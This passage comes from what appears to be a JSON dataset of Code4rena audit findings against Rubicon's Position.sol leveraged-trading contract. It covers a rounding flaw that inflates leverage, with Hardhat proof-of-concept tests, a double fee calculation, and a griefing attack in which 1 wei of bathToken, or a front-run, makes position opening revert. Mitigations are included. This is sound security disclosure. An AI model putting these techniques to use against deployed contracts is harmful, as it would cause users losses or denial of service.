borrowing will be done so that alice's position reaches 4e8+4e8 * 0.7 = 6.8 WBTC, at which point alice's leverage is 1.7e18, much larger than alice's expectations, too high leverage will increase the risk of alice is liquidated.\n```solidity\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n```\n",
        "recommendation": "## Recommended Mitigation Steps\nConsider rounding up in _borrowLimit when calculating _desiredAmount.\nOr consider not borrowing when _lastBorrow == 0 and modifying the logic of the rest of the code\n",
        "poc": "## Proof of Concept\nThe POC and output are as follows, it can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        const x1_1 = parseUnits(\"1.000000000000000001\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_1\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n      });\n\n      it(\"POC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_25\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount2 : %s\",position[2]);\n\n      });\n      it(\"POC3\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_337\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount3 : %s\",position[2]);\n      });\n```\n\n```sh\nborrowedAmount1 : 252000\n        âœ“ POC1\nborrowedAmount2 : 90000\n        âœ“ POC2\nborrowedAmount3 : 121320\n        âœ“ POC3\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L534\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nhardhat\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L534\n\n\n# Vulnerability details\n\n## Impact\nopenPosition creates a leveraged position for the user based on initMargin and leverage, and in _borrowLimit, it calculates the number of borrowing loops needed to reach the desired amount.\n```solidity\n        (vars.limit, vars.lastBorrow) = _borrowLimit(\n            bathTokenAsset,\n            asset,\n            initMargin,\n            leverage\n        );\n```\nFor example, if initMargin = 1e18 and leverage = 2, then _desiredAmount = 2e18, and if the collateral factor is 0.7, the user's position after the first borrowing is 1e18 + 1e18 * 0.7 = 1.7e18, and the user's position after the second borrowing is 1e18 + 1e18 * 0.7 + 1e18 * 0.7 * 0.7 = 2.19e18.\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n        // check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n\t// how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n\t\t// if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n\t\t    // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n                } else {\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor);\n                }\n            } else {\n                _loopBorrowed = wmul(_loopBorrowed, _collateralFactor);\n            }\n\n            // here _assetAmount refers to the\n            // TOTAL asset amount in the position\n            _assetAmount += _loopBorrowed;\n```\nFor the excess of 0.19e18, _lastBorrow is used as the percentage of the last borrow. It should be noted that when _lastBorrow = 0, it means that the percentage of this borrowing is 100%.\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n            } else if (_assetAmount == _desiredAmount) {\n                // 1x short or perfect matching\n                _limit++;\n                break;\n            } else {\n                // default case\n                _limit++;\n            }\n...\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n```\nAlthough the long leverage must be greater than 1e18, the user can make the long leverage == 1e18+1 to make the long leverage small, but in this case, the loss of precision in the calculation will cause the user to have a higher leverage than expected\n```solidity\n    function _leverageCheck(uint256 _leverage, bool _long) internal pure {\n        uint256 _wad = WAD;\n        uint256 _leverageMax = WAD.mul(3);\n\n        _long // long can't be with 1x leverage\n            ? require(\n                _leverage > _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Long}: INVLAID LEVERAGE\"\n            )\n            : require(\n                _leverage >= _wad && _leverage <= _leverageMax,\n                \"_leverageCheck{Short}: INVLAID LEVERAGE\"\n            );\n    }\n```\nConsider the following scenario\nThe collateral factor of WBTC is 0.7, alice provides 4e8 WBTC and 1e18+1 long leverage to call the buyAllAmountWithLeverage function.\nSince wmul is rounded rather than rounded up, the _desiredAmount calculated in _borrowLimit is equal to wmul(4e8,1e18+1) == 4e8\n```solidity\n        uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n```\nAfter that, since _borrowDelta == 0, _borrowLimit returns limit == 1 and _lastBorrow == 0\n```solidity\n            if (_assetAmount > _desiredAmount) {\n                // in case we've borrowed more than needed\n                // return excess and calculate how much is\n                // needed to borrow on the last loop\n                // to not overflow _desiredAmount\n                uint256 _borrowDelta = _desiredAmount.sub(\n                    _assetAmount.sub(_loopBorrowed)\n                );\n                _lastBorrow = _borrowDelta.mul(WAD).div(_loopBorrowed);\n\n                _limit++;\n                break;\n```\nThen in openPosition, since _lastBorrow == 0, borrowing will be done so that alice's position reaches 4e8+4e8 * 0.7 = 6.8 WBTC, at which point alice's leverage is 1.7e18, much larger than alice's expectations, too high leverage will increase the risk of alice is liquidated.\n```solidity\n            if (i.add(1) == vars.limit && vars.lastBorrow != 0) {\n                vars.toBorrow = vars.lastBorrow;\n            } else {\n                // otherwise borrow max amount available to borrow - 100% from _maxBorrow\n                vars.toBorrow = WAD;\n            }\n\n            // increase bathToken amount in order to save it in positions map\n            vars.currentBathTokenAmount += _borrowLoop(\n                asset,\n                quote,\n                bathTokenAsset,\n                bathTokenQuote,\n                vars.currentAssetBalance,\n                vars.toBorrow\n            );\n```\n## Proof of Concept\nThe POC and output are as follows, it can be seen that the borrowed amount of 1e18+1 is greater than 1.25e18 and 1.337e18, and the actual leverage of 1e18+1 is 1.7e18\n```js\n    describe(\"Long positions ðŸ“ˆ\", function () {\n      it(\"POC1\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        const x1_1 = parseUnits(\"1.000000000000000001\");\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_1\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount1 : %s\",position[2]);\n      });\n\n      it(\"POC2\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_25\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount2 : %s\",position[2]);\n\n      });\n      it(\"POC3\", async function () {\n        const { owner, testCoin, testStableCoin, Position } = await loadFixture(\n          deployPoolsUtilityFixture\n        );\n        const TEST_AMOUNT_0_4 = parseUnits(\"0.4\");\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT_0_4,\n          x1_337\n        );\n\n        const position = await Position.positions(1);\n\n        console.log(\"borrowedAmount3 : %s\",position[2]);\n      });\n```\n\n```sh\nborrowedAmount1 : 252000\n        âœ“ POC1\nborrowedAmount2 : 90000\n        âœ“ POC2\nborrowedAmount3 : 121320\n        âœ“ POC3\n```\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L526-L583\n## Tools Used\nhardhat\n## Recommended Mitigation Steps\nConsider rounding up in _borrowLimit when calculating _desiredAmount.\nOr consider not borrowing when _lastBorrow == 0 and modifying the logic of the rest of the code\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 282,
      "page_start": null,
      "heading": "282. Incorrect fee handling in Position.sol's Market Buy/Sell functions",
      "heading_cleaned": "Incorrect fee handling in Position.sol's Market Buy/Sell functions",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511\n\n\n# Vulnerability details\n\nImpact\n\nThe incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.\n\n\n## Proof of Concept\n\nIn Position.t.sol, `_rubiconSwap_` executes the order in the RubiconMarket when opening/closing a position.\n\nrubiconSwap can call either marketBuy or marketSell, depending on the circumstances.\n\nThe issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n\n        // @audit fee is applied twice?\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\n\n```solidity\n  function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        // @audit fee?\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        // @audit doesnt account for maker fee\n\n        // Add the BASE fee to the amount to be paid\n\n\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee) // transfer fee\n            );\n        }\n```\n\nAs discussed with the sponsor, the proper approach for v2 trades is _do not account for the fee_. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).\n\nSo basically, this fee calculation in Position is useless for v2, and that's an issue.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nRemove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511\n\n\n# Vulnerability details\n\nImpact\n\nThe incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.\n\n\n## Proof of Concept\n\nIn Position.t.sol, `_rubiconSwap_` executes the order in the RubiconMarket when opening/closing a position.\n\nrubiconSwap can call either marketBuy or marketSell, depending on the circumstances.\n\nThe issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n\n        // @audit fee is applied twice?\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        \n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\n\n```solidity\n  function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        // @audit fee?\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        // @audit doesnt account for maker fee\n\n        // Add the BASE fee to the amount to be paid\n\n\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee) // transfer fee\n            );\n        }\n```\n\nAs discussed with the sponsor, the proper approach for v2 trades is _do not account for the fee_. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee). \n\nSo basically, this fee calculation in Position is useless for v2, and that's an issue.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nRemove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.\n",
      "description": null,
      "impact": null,
      "mitigation": "## Recommended Mitigation Steps\n\nRemove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.\n",
      "poc": "## Proof of Concept\n\nIn Position.t.sol, `_rubiconSwap_` executes the order in the RubiconMarket when opening/closing a position.\n\nrubiconSwap can call either marketBuy or marketSell, depending on the circumstances.\n\nThe issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n\n        // @audit fee is applied twice?\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\n\n```solidity\n  function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        // @audit fee?\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        // @audit doesnt account for maker fee\n\n        // Add the BASE fee to the amount to be paid\n\n\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee) // transfer fee\n            );\n        }\n```\n\nAs discussed with the sponsor, the proper approach for v2 trades is _do not account for the fee_. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).\n\nSo basically, this fee calculation in Position is useless for v2, and that's an issue.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511\n\n**container:**\n# Vulnerability details\n\nImpact\n\nThe incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.\n\n**tools_used:**\n## Tools Used\n\nManual review\n",
      "sections": {
        "description": null,
        "impact": null,
        "recommendation": "## Recommended Mitigation Steps\n\nRemove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.\n",
        "poc": "## Proof of Concept\n\nIn Position.t.sol, `_rubiconSwap_` executes the order in the RubiconMarket when opening/closing a position.\n\nrubiconSwap can call either marketBuy or marketSell, depending on the circumstances.\n\nThe issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n\n        // @audit fee is applied twice?\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\n\n```solidity\n  function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        // @audit fee?\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        // @audit doesnt account for maker fee\n\n        // Add the BASE fee to the amount to be paid\n\n\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee) // transfer fee\n            );\n        }\n```\n\nAs discussed with the sponsor, the proper approach for v2 trades is _do not account for the fee_. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).\n\nSo basically, this fee calculation in Position is useless for v2, and that's an issue.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511\n\n**container:**\n# Vulnerability details\n\nImpact\n\nThe incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.\n\n**tools_used:**\n## Tools Used\n\nManual review\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511\n\n\n# Vulnerability details\n\nImpact\n\nThe incorrect fee handling in the `Position.sol` market buy and sell functions can lead to improper fee deductions and wrong trade execution.\n\n\n## Proof of Concept\n\nIn Position.t.sol, `_rubiconSwap_` executes the order in the RubiconMarket when opening/closing a position.\n\nrubiconSwap can call either marketBuy or marketSell, depending on the circumstances.\n\nThe issue is that both [marketBuy](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L454-L473) and [marketSell](https://github.com/code-423n4/2023-04-rubicon/blob/511636d889742296a54392875a35e4c0c4727bb7/contracts/utilities/poolsUtility/Position.sol#L475-L511) account for fees, where they shouldn't.\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n\n        // @audit fee is applied twice?\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\n\n```solidity\n  function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        // @audit fee?\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        // @audit doesnt account for maker fee\n\n        // Add the BASE fee to the amount to be paid\n\n\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee) // transfer fee\n            );\n        }\n```\n\nAs discussed with the sponsor, the proper approach for v2 trades is _do not account for the fee_. Instead, it should be taken from the input amount, unlike in v1 (where it was needed for the input amount to have some addition to paying the fee).\n\nSo basically, this fee calculation in Position is useless for v2, and that's an issue.\n\n## Tools Used\n\nManual review\n\n\n## Recommended Mitigation Steps\n\nRemove all fee calculations from the `_marketBuy` and `_marketSell` functions in `Position.sol`. As per the discussion with the sponsor, fees should not be accounted for in these functions for v2 trades.\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 293,
      "page_start": null,
      "heading": "293. Both buyAllAmountWithLeverage and sellAllAmountWithLeverage always revert",
      "heading_cleaned": "Both buyAllAmountWithLeverage and sellAllAmountWithLeverage always revert",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n\n\n# Vulnerability details\n\n## Impact\n\nBoth `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.\n\n## Proof of Concept\n\n`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the _loopBorrowed variable.\n\n```solidity\n// check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n    // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n        // if collateral already provided\n                if (_minted != 0) {\n                    uint256 _max = _maxBorrow(_bathToken);\n\n            // take into account previous collateral\n                    _loopBorrowed = wmul(_assetAmount, _collateralFactor).add(\n                        _max\n                    );\n```\n\nNext, look at the code of `_maxBorrow`:\n\n```solidity\nfunction _maxBorrow(\n        address _bathToken\n    ) internal view returns (uint256 _max) {\n        (uint256 _err, uint256 _liq, uint256 _shortfall) = comptroller\n            .getAccountLiquidity(address(this));\t\t//if address(this) is new user of comptroller, _liq always equal to 0\n\n        require(_err == 0, \"_maxBorrow: ERROR\");\n        require(_liq > 0, \"_maxBorrow: LIQUIDITY == 0\");\t//if _liq equals to 0, tx will revert.\n        require(_shortfall == 0, \"_maxBorrow: SHORTFALL != 0\");\n\n        uint256 _price = oracle.getUnderlyingPrice(CToken(_bathToken));\n        _max = (_liq.mul(10 ** 18)).div(_price);\n        require(_max > 0, \"_maxBorrow: can't borrow 0\");\n    }\n```\n\nTo make the _liq returned by `comptroller.getAccountLiquidity(address(this))` be 0, then address(this) must not provide any collateral. In other words, **this contract is a new user to the comptroller**. Obviously, the Position contract created by the user meets this condition.\n\nThe condition for calling `_maxBorrow` is that `IERC20(_bathToken).balanceOf(address(this))` returns a non-zero value. **A newly created Position contract does not have any tokens. However, we can transfer 1wei _bathToken to it**. This allows the code to execute to _maxBorrow and revert.\n\n**There are two ways to transfer _bathToken to the newly created Position**:\n\n1.  front-run `buyAllAmountWithLeverage` or `sellAllAmountWithLeverage`.\n2.  Once the Position is created, transfer all _bathTokens supported by BathHouseV2 to it. The amount transferred is 1wei.\n\nIn fact, `_maxBorrow` will also revert in normal scenario. Position borrows other tokens resulting in _liq being 0.\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe should use `comptroller.getAccountLiquidity` instead of the balance of _bathToken as the condition for calling `_maxBorrow`.\n\n```diff\n--- a/contracts/utilities/poolsUtility/Position.sol\n+++ b/contracts/utilities/poolsUtility/Position.sol\n@@ -534,7 +534,7 @@ contract Position is Ownable, DSMath {\n         uint256 _desiredAmount = wmul(_assetAmount, _leverage);\n\n         // check if collateral was already supplied\n-        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n+        (,uint256 _minted,) = comptroller.getAccountLiquidity(address(this));\n        // how much is borrowed on a current loop\n         uint256 _loopBorrowed;\n```\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L545\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L306-L319\n\n\n# Vulnerability details\n\n## Impact\n\nBoth `buyAllAmountWithLeverage` and `sellAllAmountWithLeverage` always revert. **So all users cannot open a leveraged position**.\n\n## Proof of Concept\n\n`openPosition` is the entry point for users to open long/short positions, internally calling the `_borrowLimit` function to calculate an amount of iterations needed to reach desired amount with leverage. The logic of this function is: if the collateral has been provided, then the `_maxBorrow` function will be called to calculate the maximum amount available to borrow from `_bathToken` market, and then the returned result will be added to the _loopBorrowed variable.\n\n```solidity\n// check if collateral was already supplied\n        uint256 _minted = IERC20(_bathToken).balanceOf(address(this));\n    // how much is borrowed on a current loop\n        uint256 _loopBorrowed;\n\n        while (_assetAmount <= _desiredAmount) {\n            if (_limit == 0) {\n        // if collateral already provided\n                if (_minted != 